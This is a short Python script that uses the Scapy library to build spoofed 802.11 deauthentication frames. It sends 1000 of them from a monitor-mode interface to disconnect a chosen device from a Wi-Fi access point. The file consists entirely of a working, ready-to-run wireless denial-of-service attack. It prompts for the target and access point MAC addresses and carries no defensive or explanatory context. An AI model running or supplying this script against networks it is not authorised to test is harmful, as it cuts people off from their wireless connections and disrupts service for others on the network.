#!/usr/local/bin/python3

from scapy.all import*

def send_deauth():
        target_mac = input('Enter the target device MAC address: ')
        gateway_mac = input('Enter the access point MAC address: ')
        iface = input('Enter the interface in monitor mode: ')

        #Crafting the Deauthentication Packet 
        dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, 
addr3=gateway_mac)
        packet = RadioTap() /dot11/Dot11Deauth()

        #Sending deauth packets 
        print(f'Sending deauth packets to {target_mac}')
        sendp(packet, iface=iface, count=1000, inter=0.1)

send_deauth()
